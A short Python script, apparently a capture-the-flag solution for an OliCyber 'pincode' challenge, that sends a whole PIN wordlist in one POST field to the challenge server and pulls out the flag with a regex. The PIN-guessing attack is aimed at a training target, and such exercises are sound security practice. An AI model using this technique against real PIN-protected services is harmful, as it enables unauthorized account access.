import requests
import re
# Ho usato una wordlist ossia 'pincode.txt' trovabile sulla repository wordlist

payload = ''
with open('pincode.txt','r') as f:
    payload = f.read()
    
pincode = {
    'pincode': payload
}
url = 'http://pincode.challs.olicyber.it/'
r = requests.post(url=url, data=pincode)
search = r"flag{[a-zA-Z0-9_-]+\}"
flag = re.search(search, r.text)
print(flag.group())